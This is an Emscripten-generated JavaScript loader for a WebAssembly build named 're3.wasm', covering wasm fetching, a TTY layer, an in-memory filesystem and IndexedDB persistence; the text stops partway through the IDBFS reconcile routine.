var createRe3Module = (() => {
    var _scriptName = globalThis.document?.currentScript?.src;
    return async function (moduleArg = {}) {
        var moduleRtn;
        var Module = moduleArg;
        var ENVIRONMENT_IS_WEB = true;
        var ENVIRONMENT_IS_WORKER = false;
        var arguments_ = [];
        var thisProgram = "./this.program";
        var quit_ = (status, toThrow) => {
            throw toThrow
        }
            ;
        var scriptDirectory = "";
        function locateFile(path) {
            if (Module["locateFile"]) {
                return Module["locateFile"](path, scriptDirectory)
            }
            return scriptDirectory + path
        }
        var readAsync, readBinary;
        if (ENVIRONMENT_IS_WEB || ENVIRONMENT_IS_WORKER) {
            try {
                scriptDirectory = new URL(".", _scriptName).href
            } catch { }
            {
                readAsync = async url => {
                    var response = await fetch(url, {
                        credentials: "same-origin"
                    });
                    if (response.ok) {
                        return response.arrayBuffer()
                    }
                    throw new Error(response.status + " : " + response.url)
                }
            }
        } else { }
        var out = console.log.bind(console);
        var err = console.error.bind(console);
        var wasmBinary;
        var ABORT = false;
        var EXITSTATUS;
        var readyPromiseResolve, readyPromiseReject;
        var HEAP8, HEAPU8, HEAP16, HEAPU16, HEAP32, HEAPU32, HEAPF32, HEAPF64;
        var HEAP64, HEAPU64;
        var runtimeInitialized = false;
        function updateMemoryViews() {
            var b = wasmMemory.buffer;
            HEAP8 = new Int8Array(b);
            HEAP16 = new Int16Array(b);
            HEAPU8 = new Uint8Array(b);
            HEAPU16 = new Uint16Array(b);
            HEAP32 = new Int32Array(b);
            HEAPU32 = new Uint32Array(b);
            HEAPF32 = new Float32Array(b);
            HEAPF64 = new Float64Array(b);
            HEAP64 = new BigInt64Array(b);
            HEAPU64 = new BigUint64Array(b)
        }
        function preRun() {
            if (Module["preRun"]) {
                if (typeof Module["preRun"] == "function")
                    Module["preRun"] = [Module["preRun"]];
                while (Module["preRun"].length) {
                    addOnPreRun(Module["preRun"].shift())
                }
            }
            callRuntimeCallbacks(onPreRuns)
        }
        function initRuntime() {
            runtimeInitialized = true;
            if (!Module["noFSInit"] && !FS.initialized)
                FS.init();
            TTY.init();
            wasmExports["lg"]();
            FS.ignorePermissions = false
        }
        function preMain() { }
        function postRun() {
            if (Module["postRun"]) {
                if (typeof Module["postRun"] == "function")
                    Module["postRun"] = [Module["postRun"]];
                while (Module["postRun"].length) {
                    addOnPostRun(Module["postRun"].shift())
                }
            }
            callRuntimeCallbacks(onPostRuns)
        }
        function abort(what) {
            Module["onAbort"]?.(what);
            what = "Aborted(" + what + ")";
            err(what);
            ABORT = true;
            what += ". Build with -sASSERTIONS for more info.";
            var e = new WebAssembly.RuntimeError(what);
            readyPromiseReject?.(e);
            throw e
        }
        var wasmBinaryFile;
        function findWasmBinary() {
            return locateFile("re3.wasm")
        }
        function getBinarySync(file) {
            if (file == wasmBinaryFile && wasmBinary) {
                return new Uint8Array(wasmBinary)
            }
            if (readBinary) {
                return readBinary(file)
            }
            throw "both async and sync fetching of the wasm failed"
        }
        async function getWasmBinary(binaryFile) {
            if (!wasmBinary) {
                try {
                    var response = await readAsync(binaryFile);
                    return new Uint8Array(response)
                } catch { }
            }
            return getBinarySync(binaryFile)
        }
        async function instantiateArrayBuffer(binaryFile, imports) {
            try {
                var binary = await getWasmBinary(binaryFile);
                var instance = await WebAssembly.instantiate(binary, imports);
                return instance
            } catch (reason) {
                err(`failed to asynchronously prepare wasm: ${reason}`);
                abort(reason)
            }
        }
        async function instantiateAsync(binary, binaryFile, imports) {
            if (!binary) {
                try {
                    var response = fetch(binaryFile, {
                        credentials: "same-origin"
                    });
                    var instantiationResult = await WebAssembly.instantiateStreaming(response, imports);
                    return instantiationResult
                } catch (reason) {
                    err(`wasm streaming compile failed: ${reason}`);
                    err("falling back to ArrayBuffer instantiation")
                }
            }
            return instantiateArrayBuffer(binaryFile, imports)
        }
        function getWasmImports() {
            var imports = {
                a: wasmImports
            };
            return imports
        }
        async function createWasm() {
            function receiveInstance(instance, module) {
                wasmExports = instance.exports;
                _alProcessPcmStreamFilter(instance);
                wasmExports = Asyncify.instrumentWasmExports(wasmExports);
                assignWasmExports(wasmExports);
                updateMemoryViews();
                return wasmExports
            }
            function receiveInstantiationResult(result) {
                return receiveInstance(result["instance"])
            }
            var info = getWasmImports();
            if (Module["instantiateWasm"]) {
                return new Promise((resolve, reject) => {
                    Module["instantiateWasm"](info, (inst, mod) => {
                        resolve(receiveInstance(inst, mod))
                    }
                    )
                }
                )
            }
            wasmBinaryFile ??= findWasmBinary();
            var result = await instantiateAsync(wasmBinary, wasmBinaryFile, info);
            var exports = receiveInstantiationResult(result);
            return exports
        }
        class ExitStatus {
            name = "ExitStatus";
            constructor(status) {
                this.message = `Program terminated with exit(${status})`;
                this.status = status
            }
        }
        var initRandomFill = () => view => crypto.getRandomValues(view);
        var randomFill = view => {
            (randomFill = initRandomFill())(view)
        }
            ;
        var PATH = {
            isAbs: path => path.charAt(0) === "/",
            splitPath: filename => {
                var splitPathRe = /^(\/?|)([\s\S]*?)((?:\.{1,2}|[^\/]+?|)(\.[^.\/]*|))(?:[\/]*)$/;
                return splitPathRe.exec(filename).slice(1)
            }
            ,
            normalizeArray: (parts, allowAboveRoot) => {
                var up = 0;
                for (var i = parts.length - 1; i >= 0; i--) {
                    var last = parts[i];
                    if (last === ".") {
                        parts.splice(i, 1)
                    } else if (last === "..") {
                        parts.splice(i, 1);
                        up++
                    } else if (up) {
                        parts.splice(i, 1);
                        up--
                    }
                }
                if (allowAboveRoot) {
                    for (; up; up--) {
                        parts.unshift("..")
                    }
                }
                return parts
            }
            ,
            normalize: path => {
                var isAbsolute = PATH.isAbs(path)
                    , trailingSlash = path.slice(-1) === "/";
                path = PATH.normalizeArray(path.split("/").filter(p => !!p), !isAbsolute).join("/");
                if (!path && !isAbsolute) {
                    path = "."
                }
                if (path && trailingSlash) {
                    path += "/"
                }
                return (isAbsolute ? "/" : "") + path
            }
            ,
            dirname: path => {
                var result = PATH.splitPath(path)
                    , root = result[0]
                    , dir = result[1];
                if (!root && !dir) {
                    return "."
                }
                if (dir) {
                    dir = dir.slice(0, -1)
                }
                return root + dir
            }
            ,
            basename: path => path && path.match(/([^\/]+|\/)\/*$/)[1],
            join: (...paths) => PATH.normalize(paths.join("/")),
            join2: (l, r) => PATH.normalize(l + "/" + r)
        };
        var PATH_FS = {
            resolve: (...args) => {
                var resolvedPath = ""
                    , resolvedAbsolute = false;
                for (var i = args.length - 1; i >= -1 && !resolvedAbsolute; i--) {
                    var path = i >= 0 ? args[i] : FS.cwd();
                    if (typeof path != "string") {
                        throw new TypeError("Arguments to path.resolve must be strings")
                    } else if (!path) {
                        return ""
                    }
                    resolvedPath = path + "/" + resolvedPath;
                    resolvedAbsolute = PATH.isAbs(path)
                }
                resolvedPath = PATH.normalizeArray(resolvedPath.split("/").filter(p => !!p), !resolvedAbsolute).join("/");
                return (resolvedAbsolute ? "/" : "") + resolvedPath || "."
            }
            ,
            relative: (from, to) => {
                from = PATH_FS.resolve(from).slice(1);
                to = PATH_FS.resolve(to).slice(1);
                function trim(arr) {
                    var start = 0;
                    for (; start < arr.length; start++) {
                        if (arr[start] !== "")
                            break
                    }
                    var end = arr.length - 1;
                    for (; end >= 0; end--) {
                        if (arr[end] !== "")
                            break
                    }
                    if (start > end)
                        return [];
                    return arr.slice(start, end - start + 1)
                }
                var fromParts = trim(from.split("/"));
                var toParts = trim(to.split("/"));
                var length = Math.min(fromParts.length, toParts.length);
                var samePartsLength = length;
                for (var i = 0; i < length; i++) {
                    if (fromParts[i] !== toParts[i]) {
                        samePartsLength = i;
                        break
                    }
                }
                var outputParts = [];
                for (var i = samePartsLength; i < fromParts.length; i++) {
                    outputParts.push("..")
                }
                outputParts = outputParts.concat(toParts.slice(samePartsLength));
                return outputParts.join("/")
            }
        };
        var UTF8Decoder = new TextDecoder;
        var findStringEnd = (heapOrArray, idx, maxBytesToRead, ignoreNul) => {
            var maxIdx = idx + maxBytesToRead;
            if (ignoreNul)
                return maxIdx;
            while (heapOrArray[idx] && !(idx >= maxIdx))
                ++idx;
            return idx
        }
            ;
        var UTF8ArrayToString = (heapOrArray, idx = 0, maxBytesToRead, ignoreNul) => {
            var endPtr = findStringEnd(heapOrArray, idx, maxBytesToRead, ignoreNul);
            return UTF8Decoder.decode(heapOrArray.buffer ? heapOrArray.subarray(idx, endPtr) : new Uint8Array(heapOrArray.slice(idx, endPtr)))
        }
            ;
        var FS_stdin_getChar_buffer = [];
        var lengthBytesUTF8 = str => {
            var len = 0;
            for (var i = 0; i < str.length; ++i) {
                var c = str.charCodeAt(i);
                if (c <= 127) {
                    len++
                } else if (c <= 2047) {
                    len += 2
                } else if (c >= 55296 && c <= 57343) {
                    len += 4;
                    ++i
                } else {
                    len += 3
                }
            }
            return len
        }
            ;
        var stringToUTF8Array = (str, heap, outIdx, maxBytesToWrite) => {
            if (!(maxBytesToWrite > 0))
                return 0;
            var startIdx = outIdx;
            var endIdx = outIdx + maxBytesToWrite - 1;
            for (var i = 0; i < str.length; ++i) {
                var u = str.codePointAt(i);
                if (u <= 127) {
                    if (outIdx >= endIdx)
                        break;
                    heap[outIdx++] = u
                } else if (u <= 2047) {
                    if (outIdx + 1 >= endIdx)
                        break;
                    heap[outIdx++] = 192 | u >> 6;
                    heap[outIdx++] = 128 | u & 63
                } else if (u <= 65535) {
                    if (outIdx + 2 >= endIdx)
                        break;
                    heap[outIdx++] = 224 | u >> 12;
                    heap[outIdx++] = 128 | u >> 6 & 63;
                    heap[outIdx++] = 128 | u & 63
                } else {
                    if (outIdx + 3 >= endIdx)
                        break;
                    heap[outIdx++] = 240 | u >> 18;
                    heap[outIdx++] = 128 | u >> 12 & 63;
                    heap[outIdx++] = 128 | u >> 6 & 63;
                    heap[outIdx++] = 128 | u & 63;
                    i++
                }
            }
            heap[outIdx] = 0;
            return outIdx - startIdx
        }
            ;
        var intArrayFromString = (stringy, dontAddNull, length) => {
            var len = length > 0 ? length : lengthBytesUTF8(stringy) + 1;
            var u8array = new Array(len);
            var numBytesWritten = stringToUTF8Array(stringy, u8array, 0, u8array.length);
            if (dontAddNull)
                u8array.length = numBytesWritten;
            return u8array
        }
            ;
        var FS_stdin_getChar = () => {
            if (!FS_stdin_getChar_buffer.length) {
                var result = null;
                if (globalThis.window?.prompt) {
                    result = window.prompt("Input: ");
                    if (result !== null) {
                        result += "\n"
                    }
                } else { }
                if (!result) {
                    return null
                }
                FS_stdin_getChar_buffer = intArrayFromString(result, true)
            }
            return FS_stdin_getChar_buffer.shift()
        }
            ;
        var TTY = {
            ttys: [],
            init() { },
            shutdown() { },
            register(dev, ops) {
                TTY.ttys[dev] = {
                    input: [],
                    output: [],
                    ops
                };
                FS.registerDevice(dev, TTY.stream_ops)
            },
            stream_ops: {
                open(stream) {
                    var tty = TTY.ttys[stream.node.rdev];
                    if (!tty) {
                        throw new FS.ErrnoError(43)
                    }
                    stream.tty = tty;
                    stream.seekable = false
                },
                close(stream) {
                    stream.tty.ops.fsync(stream.tty)
                },
                fsync(stream) {
                    stream.tty.ops.fsync(stream.tty)
                },
                read(stream, buffer, offset, length, pos) {
                    if (!stream.tty || !stream.tty.ops.get_char) {
                        throw new FS.ErrnoError(60)
                    }
                    var bytesRead = 0;
                    for (var i = 0; i < length; i++) {
                        var result;
                        try {
                            result = stream.tty.ops.get_char(stream.tty)
                        } catch (e) {
                            throw new FS.ErrnoError(29)
                        }
                        if (result === undefined && bytesRead === 0) {
                            throw new FS.ErrnoError(6)
                        }
                        if (result === null || result === undefined)
                            break;
                        bytesRead++;
                        buffer[offset + i] = result
                    }
                    if (bytesRead) {
                        stream.node.atime = Date.now()
                    }
                    return bytesRead
                },
                write(stream, buffer, offset, length, pos) {
                    if (!stream.tty || !stream.tty.ops.put_char) {
                        throw new FS.ErrnoError(60)
                    }
                    try {
                        for (var i = 0; i < length; i++) {
                            stream.tty.ops.put_char(stream.tty, buffer[offset + i])
                        }
                    } catch (e) {
                        throw new FS.ErrnoError(29)
                    }
                    if (length) {
                        stream.node.mtime = stream.node.ctime = Date.now()
                    }
                    return i
                }
            },
            default_tty_ops: {
                get_char(tty) {
                    return FS_stdin_getChar()
                },
                put_char(tty, val) {
                    if (val === null || val === 10) {
                        out(UTF8ArrayToString(tty.output));
                        tty.output = []
                    } else {
                        if (val != 0)
                            tty.output.push(val)
                    }
                },
                fsync(tty) {
                    if (tty.output?.length > 0) {
                        out(UTF8ArrayToString(tty.output));
                        tty.output = []
                    }
                },
                ioctl_tcgets(tty) {
                    return {
                        c_iflag: 25856,
                        c_oflag: 5,
                        c_cflag: 191,
                        c_lflag: 35387,
                        c_cc: [3, 28, 127, 21, 4, 0, 1, 0, 17, 19, 26, 0, 18, 15, 23, 22, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                    }
                },
                ioctl_tcsets(tty, optional_actions, data) {
                    return 0
                },
                ioctl_tiocgwinsz(tty) {
                    return [24, 80]
                }
            },
            default_tty1_ops: {
                put_char(tty, val) {
                    if (val === null || val === 10) {
                        err(UTF8ArrayToString(tty.output));
                        tty.output = []
                    } else {
                        if (val != 0)
                            tty.output.push(val)
                    }
                },
                fsync(tty) {
                    if (tty.output?.length > 0) {
                        err(UTF8ArrayToString(tty.output));
                        tty.output = []
                    }
                }
            }
        };
        var mmapAlloc = size => {
            abort()
        }
            ;
        var MEMFS = {
            ops_table: null,
            mount(mount) {
                return MEMFS.createNode(null, "/", 16895, 0)
            },
            createNode(parent, name, mode, dev) {
                if (FS.isBlkdev(mode) || FS.isFIFO(mode)) {
                    throw new FS.ErrnoError(63)
                }
                MEMFS.ops_table ||= {
                    dir: {
                        node: {
                            getattr: MEMFS.node_ops.getattr,
                            setattr: MEMFS.node_ops.setattr,
                            lookup: MEMFS.node_ops.lookup,
                            mknod: MEMFS.node_ops.mknod,
                            rename: MEMFS.node_ops.rename,
                            unlink: MEMFS.node_ops.unlink,
                            rmdir: MEMFS.node_ops.rmdir,
                            readdir: MEMFS.node_ops.readdir,
                            symlink: MEMFS.node_ops.symlink
                        },
                        stream: {
                            llseek: MEMFS.stream_ops.llseek
                        }
                    },
                    file: {
                        node: {
                            getattr: MEMFS.node_ops.getattr,
                            setattr: MEMFS.node_ops.setattr
                        },
                        stream: {
                            llseek: MEMFS.stream_ops.llseek,
                            read: MEMFS.stream_ops.read,
                            write: MEMFS.stream_ops.write,
                            mmap: MEMFS.stream_ops.mmap,
                            msync: MEMFS.stream_ops.msync
                        }
                    },
                    link: {
                        node: {
                            getattr: MEMFS.node_ops.getattr,
                            setattr: MEMFS.node_ops.setattr,
                            readlink: MEMFS.node_ops.readlink
                        },
                        stream: {}
                    },
                    chrdev: {
                        node: {
                            getattr: MEMFS.node_ops.getattr,
                            setattr: MEMFS.node_ops.setattr
                        },
                        stream: FS.chrdev_stream_ops
                    }
                };
                var node = FS.createNode(parent, name, mode, dev);
                if (FS.isDir(node.mode)) {
                    node.node_ops = MEMFS.ops_table.dir.node;
                    node.stream_ops = MEMFS.ops_table.dir.stream;
                    node.contents = {}
                } else if (FS.isFile(node.mode)) {
                    node.node_ops = MEMFS.ops_table.file.node;
                    node.stream_ops = MEMFS.ops_table.file.stream;
                    node.usedBytes = 0;
                    node.contents = null
                } else if (FS.isLink(node.mode)) {
                    node.node_ops = MEMFS.ops_table.link.node;
                    node.stream_ops = MEMFS.ops_table.link.stream
                } else if (FS.isChrdev(node.mode)) {
                    node.node_ops = MEMFS.ops_table.chrdev.node;
                    node.stream_ops = MEMFS.ops_table.chrdev.stream
                }
                node.atime = node.mtime = node.ctime = Date.now();
                if (parent) {
                    parent.contents[name] = node;
                    parent.atime = parent.mtime = parent.ctime = node.atime
                }
                return node
            },
            getFileDataAsTypedArray(node) {
                if (!node.contents)
                    return new Uint8Array(0);
                if (node.contents.subarray)
                    return node.contents.subarray(0, node.usedBytes);
                return new Uint8Array(node.contents)
            },
            expandFileStorage(node, newCapacity) {
                var prevCapacity = node.contents ? node.contents.length : 0;
                if (prevCapacity >= newCapacity)
                    return;
                var CAPACITY_DOUBLING_MAX = 1024 * 1024;
                newCapacity = Math.max(newCapacity, prevCapacity * (prevCapacity < CAPACITY_DOUBLING_MAX ? 2 : 1.125) >>> 0);
                if (prevCapacity != 0)
                    newCapacity = Math.max(newCapacity, 256);
                var oldContents = node.contents;
                node.contents = new Uint8Array(newCapacity);
                if (node.usedBytes > 0)
                    node.contents.set(oldContents.subarray(0, node.usedBytes), 0)
            },
            resizeFileStorage(node, newSize) {
                if (node.usedBytes == newSize)
                    return;
                if (newSize == 0) {
                    node.contents = null;
                    node.usedBytes = 0
                } else {
                    var oldContents = node.contents;
                    node.contents = new Uint8Array(newSize);
                    if (oldContents) {
                        node.contents.set(oldContents.subarray(0, Math.min(newSize, node.usedBytes)))
                    }
                    node.usedBytes = newSize
                }
            },
            node_ops: {
                getattr(node) {
                    var attr = {};
                    attr.dev = FS.isChrdev(node.mode) ? node.id : 1;
                    attr.ino = node.id;
                    attr.mode = node.mode;
                    attr.nlink = 1;
                    attr.uid = 0;
                    attr.gid = 0;
                    attr.rdev = node.rdev;
                    if (FS.isDir(node.mode)) {
                        attr.size = 4096
                    } else if (FS.isFile(node.mode)) {
                        attr.size = node.usedBytes
                    } else if (FS.isLink(node.mode)) {
                        attr.size = node.link.length
                    } else {
                        attr.size = 0
                    }
                    attr.atime = new Date(node.atime);
                    attr.mtime = new Date(node.mtime);
                    attr.ctime = new Date(node.ctime);
                    attr.blksize = 4096;
                    attr.blocks = Math.ceil(attr.size / attr.blksize);
                    return attr
                },
                setattr(node, attr) {
                    for (const key of ["mode", "atime", "mtime", "ctime"]) {
                        if (attr[key] != null) {
                            node[key] = attr[key]
                        }
                    }
                    if (attr.size !== undefined) {
                        MEMFS.resizeFileStorage(node, attr.size)
                    }
                },
                lookup(parent, name) {
                    if (!MEMFS.doesNotExistError) {
                        MEMFS.doesNotExistError = new FS.ErrnoError(44);
                        MEMFS.doesNotExistError.stack = "<generic error, no stack>"
                    }
                    throw MEMFS.doesNotExistError
                },
                mknod(parent, name, mode, dev) {
                    return MEMFS.createNode(parent, name, mode, dev)
                },
                rename(old_node, new_dir, new_name) {
                    var new_node;
                    try {
                        new_node = FS.lookupNode(new_dir, new_name)
                    } catch (e) { }
                    if (new_node) {
                        if (FS.isDir(old_node.mode)) {
                            for (var i in new_node.contents) {
                                throw new FS.ErrnoError(55)
                            }
                        }
                        FS.hashRemoveNode(new_node)
                    }
                    delete old_node.parent.contents[old_node.name];
                    new_dir.contents[new_name] = old_node;
                    old_node.name = new_name;
                    new_dir.ctime = new_dir.mtime = old_node.parent.ctime = old_node.parent.mtime = Date.now()
                },
                unlink(parent, name) {
                    delete parent.contents[name];
                    parent.ctime = parent.mtime = Date.now()
                },
                rmdir(parent, name) {
                    var node = FS.lookupNode(parent, name);
                    for (var i in node.contents) {
                        throw new FS.ErrnoError(55)
                    }
                    delete parent.contents[name];
                    parent.ctime = parent.mtime = Date.now()
                },
                readdir(node) {
                    return [".", "..", ...Object.keys(node.contents)]
                },
                symlink(parent, newname, oldpath) {
                    var node = MEMFS.createNode(parent, newname, 511 | 40960, 0);
                    node.link = oldpath;
                    return node
                },
                readlink(node) {
                    if (!FS.isLink(node.mode)) {
                        throw new FS.ErrnoError(28)
                    }
                    return node.link
                }
            },
            stream_ops: {
                read(stream, buffer, offset, length, position) {
                    var contents = stream.node.contents;
                    if (position >= stream.node.usedBytes)
                        return 0;
                    var size = Math.min(stream.node.usedBytes - position, length);
                    if (size > 8 && contents.subarray) {
                        buffer.set(contents.subarray(position, position + size), offset)
                    } else {
                        for (var i = 0; i < size; i++)
                            buffer[offset + i] = contents[position + i]
                    }
                    return size
                },
                write(stream, buffer, offset, length, position, canOwn) {
                    if (buffer.buffer === HEAP8.buffer) {
                        canOwn = false
                    }
                    if (!length)
                        return 0;
                    var node = stream.node;
                    node.mtime = node.ctime = Date.now();
                    if (buffer.subarray && (!node.contents || node.contents.subarray)) {
                        if (canOwn) {
                            node.contents = buffer.subarray(offset, offset + length);
                            node.usedBytes = length;
                            return length
                        } else if (node.usedBytes === 0 && position === 0) {
                            node.contents = buffer.slice(offset, offset + length);
                            node.usedBytes = length;
                            return length
                        } else if (position + length <= node.usedBytes) {
                            node.contents.set(buffer.subarray(offset, offset + length), position);
                            return length
                        }
                    }
                    MEMFS.expandFileStorage(node, position + length);
                    if (node.contents.subarray && buffer.subarray) {
                        node.contents.set(buffer.subarray(offset, offset + length), position)
                    } else {
                        for (var i = 0; i < length; i++) {
                            node.contents[position + i] = buffer[offset + i]
                        }
                    }
                    node.usedBytes = Math.max(node.usedBytes, position + length);
                    return length
                },
                llseek(stream, offset, whence) {
                    var position = offset;
                    if (whence === 1) {
                        position += stream.position
                    } else if (whence === 2) {
                        if (FS.isFile(stream.node.mode)) {
                            position += stream.node.usedBytes
                        }
                    }
                    if (position < 0) {
                        throw new FS.ErrnoError(28)
                    }
                    return position
                },
                mmap(stream, length, position, prot, flags) {
                    if (!FS.isFile(stream.node.mode)) {
                        throw new FS.ErrnoError(43)
                    }
                    var ptr;
                    var allocated;
                    var contents = stream.node.contents;
                    if (!(flags & 2) && contents && contents.buffer === HEAP8.buffer) {
                        allocated = false;
                        ptr = contents.byteOffset
                    } else {
                        allocated = true;
                        ptr = mmapAlloc(length);
                        if (!ptr) {
                            throw new FS.ErrnoError(48)
                        }
                        if (contents) {
                            if (position > 0 || position + length < contents.length) {
                                if (contents.subarray) {
                                    contents = contents.subarray(position, position + length)
                                } else {
                                    contents = Array.prototype.slice.call(contents, position, position + length)
                                }
                            }
                            HEAP8.set(contents, ptr)
                        }
                    }
                    return {
                        ptr,
                        allocated
                    }
                },
                msync(stream, buffer, offset, length, mmapFlags) {
                    MEMFS.stream_ops.write(stream, buffer, 0, length, offset, false);
                    return 0
                }
            }
        };
        var FS_modeStringToFlags = str => {
            var flagModes = {
                r: 0,
                "r+": 2,
                w: 512 | 64 | 1,
                "w+": 512 | 64 | 2,
                a: 1024 | 64 | 1,
                "a+": 1024 | 64 | 2
            };
            var flags = flagModes[str];
            if (typeof flags == "undefined") {
                throw new Error(`Unknown file open mode: ${str}`)
            }
            return flags
        }
            ;
        var FS_getMode = (canRead, canWrite) => {
            var mode = 0;
            if (canRead)
                mode |= 292 | 73;
            if (canWrite)
                mode |= 146;
            return mode
        }
            ;
        var IDBFS = {
            dbs: {},
            indexedDB: () => indexedDB,
            DB_VERSION: 21,
            DB_STORE_NAME: "FILE_DATA",
            queuePersist: mount => {
                function onPersistComplete() {
                    if (mount.idbPersistState === "again")
                        startPersist();
                    else
                        mount.idbPersistState = 0
                }
                function startPersist() {
                    mount.idbPersistState = "idb";
                    IDBFS.syncfs(mount, false, onPersistComplete)
                }
                if (!mount.idbPersistState) {
                    mount.idbPersistState = setTimeout(startPersist, 0)
                } else if (mount.idbPersistState === "idb") {
                    mount.idbPersistState = "again"
                }
            }
            ,
            mount: mount => {
                var mnt = MEMFS.mount(mount);
                if (mount?.opts?.autoPersist) {
                    mount.idbPersistState = 0;
                    var memfs_node_ops = mnt.node_ops;
                    mnt.node_ops = {
                        ...mnt.node_ops
                    };
                    mnt.node_ops.mknod = (parent, name, mode, dev) => {
                        var node = memfs_node_ops.mknod(parent, name, mode, dev);
                        node.node_ops = mnt.node_ops;
                        node.idbfs_mount = mnt.mount;
                        node.memfs_stream_ops = node.stream_ops;
                        node.stream_ops = {
                            ...node.stream_ops
                        };
                        node.stream_ops.write = (stream, buffer, offset, length, position, canOwn) => {
                            stream.node.isModified = true;
                            return node.memfs_stream_ops.write(stream, buffer, offset, length, position, canOwn)
                        }
                            ;
                        node.stream_ops.close = stream => {
                            var n = stream.node;
                            if (n.isModified) {
                                IDBFS.queuePersist(n.idbfs_mount);
                                n.isModified = false
                            }
                            if (n.memfs_stream_ops.close)
                                return n.memfs_stream_ops.close(stream)
                        }
                            ;
                        IDBFS.queuePersist(mnt.mount);
                        return node
                    }
                        ;
                    mnt.node_ops.rmdir = (...args) => (IDBFS.queuePersist(mnt.mount),
                        memfs_node_ops.rmdir(...args));
                    mnt.node_ops.symlink = (...args) => (IDBFS.queuePersist(mnt.mount),
                        memfs_node_ops.symlink(...args));
                    mnt.node_ops.unlink = (...args) => (IDBFS.queuePersist(mnt.mount),
                        memfs_node_ops.unlink(...args));
                    mnt.node_ops.rename = (...args) => (IDBFS.queuePersist(mnt.mount),
                        memfs_node_ops.rename(...args))
                }
                return mnt
            }
            ,
            syncfs: (mount, populate, callback) => {
                IDBFS.getLocalSet(mount, (err, local) => {
                    if (err)
                        return callback(err);
                    IDBFS.getRemoteSet(mount, (err, remote) => {
                        if (err)
                            return callback(err);
                        var src = populate ? remote : local;
                        var dst = populate ? local : remote;
                        IDBFS.reconcile(src, dst, callback)
                    }
                    )
                }
                )
            }
            ,
            quit: () => {
                for (var value of Object.values(IDBFS.dbs)) {
                    value.close()
                }
                IDBFS.dbs = {}
            }
            ,
            getDB: (name, callback) => {
                var db = IDBFS.dbs[name];
                if (db) {
                    return callback(null, db)
                }
                var req;
                try {
                    req = IDBFS.indexedDB().open(name, IDBFS.DB_VERSION)
                } catch (e) {
                    return callback(e)
                }
                if (!req) {
                    return callback("Unable to connect to IndexedDB")
                }
                req.onupgradeneeded = e => {
                    var db = e.target.result;
                    var transaction = e.target.transaction;
                    var fileStore;
                    if (db.objectStoreNames.contains(IDBFS.DB_STORE_NAME)) {
                        fileStore = transaction.objectStore(IDBFS.DB_STORE_NAME)
                    } else {
                        fileStore = db.createObjectStore(IDBFS.DB_STORE_NAME)
                    }
                    if (!fileStore.indexNames.contains("timestamp")) {
                        fileStore.createIndex("timestamp", "timestamp", {
                            unique: false
                        })
                    }
                }
                    ;
                req.onsuccess = () => {
                    db = req.result;
                    IDBFS.dbs[name] = db;
                    callback(null, db)
                }
                    ;
                req.onerror = e => {
                    callback(e.target.error);
                    e.preventDefault()
                }
            }
            ,
            getLocalSet: (mount, callback) => {
                var entries = {};
                function isRealDir(p) {
                    return p !== "." && p !== ".."
                }
                function toAbsolute(root) {
                    return p => PATH.join2(root, p)
                }
                var check = FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint));
                while (check.length) {
                    var path = check.pop();
                    var stat;
                    try {
                        stat = FS.stat(path)
                    } catch (e) {
                        return callback(e)
                    }
                    if (FS.isDir(stat.mode)) {
                        check.push(...FS.readdir(path).filter(isRealDir).map(toAbsolute(path)))
                    }
                    entries[path] = {
                        timestamp: stat.mtime
                    }
                }
                return callback(null, {
                    type: "local",
                    entries
                })
            }
            ,
            getRemoteSet: (mount, callback) => {
                var entries = {};
                IDBFS.getDB(mount.mountpoint, (err, db) => {
                    if (err)
                        return callback(err);
                    try {
                        var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readonly");
                        transaction.onerror = e => {
                            callback(e.target.error);
                            e.preventDefault()
                        }
                            ;
                        var store = transaction.objectStore(IDBFS.DB_STORE_NAME);
                        var index = store.index("timestamp");
                        index.openKeyCursor().onsuccess = event => {
                            var cursor = event.target.result;
                            if (!cursor) {
                                return callback(null, {
                                    type: "remote",
                                    db,
                                    entries
                                })
                            }
                            entries[cursor.primaryKey] = {
                                timestamp: cursor.key
                            };
                            cursor.continue()
                        }
                    } catch (e) {
                        return callback(e)
                    }
                }
                )
            }
            ,
            loadLocalEntry: (path, callback) => {
                var stat, node;
                try {
                    var lookup = FS.lookupPath(path);
                    node = lookup.node;
                    stat = FS.stat(path)
                } catch (e) {
                    return callback(e)
                }
                if (FS.isDir(stat.mode)) {
                    return callback(null, {
                        timestamp: stat.mtime,
                        mode: stat.mode
                    })
                } else if (FS.isFile(stat.mode)) {
                    node.contents = MEMFS.getFileDataAsTypedArray(node);
                    return callback(null, {
                        timestamp: stat.mtime,
                        mode: stat.mode,
                        contents: node.contents
                    })
                } else {
                    return callback(new Error("node type not supported"))
                }
            }
            ,
            storeLocalEntry: (path, entry, callback) => {
                try {
                    if (FS.isDir(entry["mode"])) {
                        FS.mkdirTree(path, entry["mode"])
                    } else if (FS.isFile(entry["mode"])) {
                        FS.writeFile(path, entry["contents"], {
                            canOwn: true
                        })
                    } else {
                        return callback(new Error("node type not supported"))
                    }
                    FS.chmod(path, entry["mode"]);
                    FS.utime(path, entry["timestamp"], entry["timestamp"])
                } catch (e) {
                    return callback(e)
                }
                callback(null)
            }
            ,
            removeLocalEntry: (path, callback) => {
                try {
                    var stat = FS.stat(path);
                    if (FS.isDir(stat.mode)) {
                        FS.rmdir(path)
                    } else if (FS.isFile(stat.mode)) {
                        FS.unlink(path)
                    }
                } catch (e) {
                    return callback(e)
                }
                callback(null)
            }
            ,
            loadRemoteEntry: (store, path, callback) => {
                var req = store.get(path);
                req.onsuccess = event => callback(null, event.target.result);
                req.onerror = e => {
                    callback(e.target.error);
                    e.preventDefault()
                }
            }
            ,
            storeRemoteEntry: (store, path, entry, callback) => {
                try {
                    var req = store.put(entry, path)
                } catch (e) {
                    callback(e);
                    return
                }
                req.onsuccess = event => callback();
                req.onerror = e => {
                    callback(e.target.error);
                    e.preventDefault()
                }
            }
            ,
            removeRemoteEntry: (store, path, callback) => {
                var req = store.delete(path);
                req.onsuccess = event => callback();
                req.onerror = e => {
                    callback(e.target.error);
                    e.preventDefault()
                }
            }
            ,
            reconcile: (src, dst, callback) => {
                var total = 0;
                var create = [];
                for (var [key, e] of Object.entries(src.entries)) {
                    var e2 = dst.entries[key];
                    if (!e2 || e["timestamp"].getTime() != e2["timestamp"].getTime()) {
                        create.push(key);
                        total++
                    }
                }
                var remove = [];
                for (var key of Object.keys(dst.entries)) {
                    if (!src.entries[key]) {
                        remove.push(key);
                        total++
                    }
                }
                if (!total) {
                    return callback(null)
                }
